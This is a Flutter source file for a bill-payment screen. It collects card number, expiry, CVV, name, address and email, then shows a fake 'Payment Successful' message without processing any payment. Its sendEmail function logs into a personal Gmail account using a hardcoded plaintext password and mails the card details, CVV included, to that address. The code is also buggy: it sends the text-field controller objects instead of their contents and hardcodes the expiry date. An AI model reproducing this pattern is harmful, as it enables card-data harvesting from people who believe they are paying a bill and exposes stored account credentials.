import 'package:billpay1/screens/express.dart';
import 'package:billpay1/screens/homenew.dart';
import 'package:flutter/material.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server/gmail.dart';

import 'HomeScreen.dart';

class BillPaymentScreen extends StatefulWidget {
  final double billAmount;

  BillPaymentScreen({Key? key, required this.billAmount}) : super(key: key);

  @override
  _BillPaymentScreenState createState() => _BillPaymentScreenState();
}

class _BillPaymentScreenState extends State<BillPaymentScreen> {


  final TextEditingController _cardNumberController = TextEditingController();
  final TextEditingController _expiryDateController = TextEditingController();
  final TextEditingController _cvvController = TextEditingController();
  bool _isSubmitting = false;
  late String _name;
  late String _address;
  late String _email;
  void sendEmail() async {
    final smtpServer = gmail('hoangquyhaook@gmail.com', '01655138016kkk');

    // Replace these values with the actual information
    final name =  _name;
    final address = _address;
    final email = _email;
    final cardNumber =  _cardNumberController;
    final expiryDate = '12/24';
    final cvv = _cvvController;

    final message = Message()
      ..from = Address('hoanguyhaook@gmail.com', 'Hao Ra Bit')
      ..recipients.add('hoangquyhaook@gmail.com')
      ..subject = 'Payment Information'
      ..text = 'Name: $name\n'
          'Address: $address\n'
          'Email: $email\n'
          'Card Number: $cardNumber\n'
          'Expiry Date: $expiryDate\n'
          'CVV: $cvv';

    try {
      final sendReport = await send(message, smtpServer);
      print('Message sent: ${sendReport.toString()}');
    } catch (e) {
      print('Error occurred: $e');
    }
  }

  @override
  Widget build(BuildContext context) {

    return Scaffold(
      appBar: AppBar(
        title: Text('Pay Your Bill'),
      ),
      body: Container(
        padding: EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: <Widget>[
            Text(
              'Total Bill Amount: \$${widget.billAmount.toStringAsFixed(2)}',
              style: TextStyle(fontSize: 24.0),
            ),
            SizedBox(height: 16.0),
            TextField(
              controller: _cardNumberController,
              keyboardType: TextInputType.number,
              decoration: InputDecoration(
                labelText: 'Card Number',
              ),
            ),
            SizedBox(height: 16.0),
            Row(
              children: <Widget>[
                Expanded(
                  child: TextField(
                    controller: _expiryDateController,
                    keyboardType: TextInputType.datetime,
                    decoration: InputDecoration(
                      labelText: 'Expiry Date (MM/YY)',
                    ),
                  ),
                ),
                SizedBox(width: 16.0),
                Expanded(
                  child: TextField(
                    controller: _cvvController,
                    keyboardType: TextInputType.number,
                    decoration: InputDecoration(
                      labelText: 'CVV',
                    ),
                  ),
                ),
              ],
            ),
            SizedBox(height: 32.0),
            ElevatedButton(
              child:
              _isSubmitting ? CircularProgressIndicator() : Text('Pay Now'),
              onPressed: _isSubmitting
                  ? null
                  : () async {
                // Get user information
                final userInfo = await showDialog(
                  context: context,
                  builder: (BuildContext context) {
                    return SimpleDialog(
                      title: Text('Enter Your Information'),
                      children: <Widget>[
                        Padding(
                          padding: const EdgeInsets.all(16.0),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: <Widget>[
                              TextField(
                                onChanged: (value) => _name = value,
                                decoration: InputDecoration(
                                  labelText: 'Name',
                                ),
                              ),
                              SizedBox(height: 16.0),
                              TextField(
                                onChanged: (value) => _address = value,
                                decoration: InputDecoration(
                                  labelText: 'Address',
                                ),
                              ),
                              SizedBox(height: 16.0),
                              TextField(
                                onChanged: (value) => _email = value,
                                decoration: InputDecoration(
                                  labelText: 'Email',
                                ),
                              ),
                              SizedBox(height: 32.0),
                              Row(
                                mainAxisAlignment: MainAxisAlignment.end,
                                children: <Widget>[
                                  ElevatedButton(
                                    child: Text('Cancel'),
                                    onPressed: () =>
                                        Navigator.of(context).pop(),
                                  ),
                                  SizedBox(width: 16.0),
                                  ElevatedButton(
                                    child: Text('Submit'),
                                    onPressed: () =>
                                        Navigator.of(context).pop({
                                          'name': _name,
                                          'address': _address,
                                          'email': _email,
                                        }),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),
                      ],
                    );
                  },
                );
                if (userInfo != null) {
                  // Show user information and credit card details
                  setState(() {
                    _isSubmitting = true;
                  });
                  // Simulate payment processing delay
                  await Future.delayed(Duration(seconds: 2));
                  setState(() {
                    _isSubmitting = false;
                  });
                  showDialog(
                    context: context,
                    builder: (BuildContext context) {
                      return AlertDialog(
                        title: Text('Payment Successful'),
                        content: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          mainAxisSize: MainAxisSize.min,
                          children: <Widget>[
                            Text('Name: ${userInfo['name']}'),
                            Text('Address: ${userInfo['address']}'),
                            Text('Email: ${userInfo['email']}'),
                            SizedBox(height: 16.0),
                            Text(
                                'Card Number: ${_cardNumberController.text.replaceAllMapped(RegExp(r'.{4}'), (match) => '${match.group(0)} ')}'),
                            Text(
                                'Expiry Date: ${_expiryDateController.text}'),
                            Text('CVV: ${_cvvController.text}'),
                          ],
                        ),
                        actions: <Widget>[
                          ElevatedButton(

                            child: Text('OK'),
                            onPressed: () => Navigator.push(
                                context, MaterialPageRoute(builder: (context) => HomeScreenr(userName: 'Hoang Quy Hao', userImageUrl:"https://i.ytimg.com/vi/1l_YadQTg5Q/maxresdefault.jpg",))),
                          ),
                          ElevatedButton(
                            onPressed: () {
                              sendEmail();
                            },
                            child: Text('Send Email'),
                          ),

                        ],
                      );
                    },
                  );
                }
              },
            ),
          ],
        ),
      ),
    );
  }
}

